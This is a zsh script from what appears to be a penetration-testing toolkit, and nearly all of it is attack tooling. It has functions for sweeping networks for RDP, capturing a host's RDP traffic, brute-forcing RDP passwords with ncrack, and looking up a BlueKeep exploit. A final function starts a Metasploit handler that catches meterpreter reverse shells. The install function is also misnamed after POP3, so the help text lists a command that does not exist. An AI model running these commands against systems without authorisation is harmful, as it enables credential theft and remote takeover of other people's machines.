#!/usr/bin/env zsh

############################################################# 
# qq-enum-rdp
#############################################################

qq-enum-rdp-help() {
  cat << END

qq-enum-rdp
------------
The qq-enum-rdp namespace contains commands for scanning 
and enumerating RDP remote desktop services.

Commands
--------
qq-enum-rdp-install:     installs dependencies
qq-enum-rdp-nmap-sweep:  scan a network for services
qq-enum-rdp-tcpdump:     capture traffic to and from a host
qq-enum-rdp-ncrack:      brute force passwords for a user account
qq-enum-rdp-exploit-bluekeep:   bluekeep exploit reference

END
}

qq-enum-pop3-install() {
    __pkgs nmap tcpdump ncrack 
}

qq-enum-rdp-nmap-sweep() {
  __check-project
  qq-vars-set-network
  print -z "nmap -n -Pn -sS -p3389 ${__NETWORK} -oA $(__netpath)/rdp-sweep"
}

qq-enum-rdp-tcpdump() {
  __check-project
  qq-vars-set-iface
  qq-vars-set-rhost
  print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3389 -w $(__hostpath)/rdp.pcap"
}

qq-enum-rdp-ncrack() {
  __check-project
  qq-vars-set-rhost
  __check-user
  print -z "ncrack -vv --user ${__USER} -P ${__PASSLIST} rdp://${__RHOST} -oN $(__hostpath)/ncrack-rdp.txt "
}

qq-enum-rdp-exploit-bluekeep() {
  __info "https://sploitus.com/exploit?id=EDB-ID:47683" 
  print -z "searchsploit bluekeep"
}


nn-shell-handler-multi-linux-mtrp() {
  local lport && read "lport?LPORT: "-
  print -z "msfconsole -x \"use exploit/multi/handler; \
    set LHOST 0.0.0.0; set LPORT ${lport}; \
    set PAYLOAD linux/x86/meterpreter/reverse_tcp; \
    run\""
}